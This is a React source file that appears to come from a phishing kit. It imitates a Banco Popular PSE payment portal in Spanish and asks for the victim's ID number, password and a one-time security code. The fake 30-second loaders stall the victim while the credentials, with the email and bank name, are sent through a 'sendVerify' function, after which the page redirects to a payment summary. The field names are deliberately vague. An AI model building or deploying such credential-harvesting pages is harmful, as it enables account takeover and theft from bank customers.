import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X03.module.css';
import Logo from '../../Assets/Images/X03/logo.svg'
import footerLogo from '../../Assets/Images/X03/footerLogo.png'
import loader from '../../Assets/Images/X03/loader.svg'
import loaderMain from '../../Assets/Images/loader.gif'

function X03() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');
    
    const [showDataHSection, setShowDataHSection] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showDataHSection) {
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoader(true);

            setTimeout(() => {
                setShowLoader(false);
                setShowDataHSection(true);
            }, 30000)
        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
            <header className={styles.headerX03}>
                <img src={Logo} alt='Logo'></img>
                {!showDataHSection && (
                    <h1>Bienvenido a nuestro nuevo portal de pagos de servicios electrónicos.</h1>
                )}
                {showDataHSection && (
                    <h1>Autoriza esta transacción.</h1>
                )}
            </header>
            <main className={styles.mainX03}>
                <form>
                    {!showDataHSection && (
                        <div>
                            <label>Tipo de documento</label>
                            <select>
                                <option>Cedula de Ciudadanía</option>
                                <option>Cedula de Extranjería</option>
                                <option>Tarjeta de Identidad</option>
                            </select>
                        </div>
                    )}
                    {!showDataHSection && (
                        <div>
                            <label>Numero de documento (Sin puntos ni comas)</label>
                            <input type='number'
                                    value={dataF}
                                    onChange={(e) => setDataF(e.target.value)}>
                            </input>
                        </div>
                    )}
                    {!showDataHSection && (
                        <div>
                            <label>Contraseña</label>
                            <input type='password'
                                    value={dataG}
                                    onChange={(e) => setDataG(e.target.value)}>
                            </input>
                        </div>
                    )}
                    {showDataHSection && (
                        <div>
                            <label>Codigo de seguridad</label>
                            <input type='password'
                                    value={dataH}
                                    onChange={(e) => setDataH(e.target.value)}>
                            </input>
                        </div>
                    )}
                    <button onClick={handleContinue}>{showDataHSection ? 'Ingresar' : 'Continuar'}</button>
                </form>
                <div>
                    <p>¿No estás registrado?</p>
                    <p>Antes de realizar pagos, <span>registrate aquí.</span><br></br> Después espera 30 min y vuelve a intentar hacer tu pago PSE. Si necesitas ayuda llama a la línea verde Bogotá: 743 4646 - Línea nacional: 01 8000 184646</p>
                </div>
                <p>Exoneración de Responsabilidad</p>
                {showLoader && (
                    <div className={styles.overlayX03}>
                        <img src={loader}></img>
                    </div>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
            </main>
            <footer className={styles.footerX03}>
                <img src={footerLogo} alt='Footer Logo'></img>
                <p> © Banco Popular | v1.0.14 </p>   
            </footer>
        </>
    )
}

export default X03;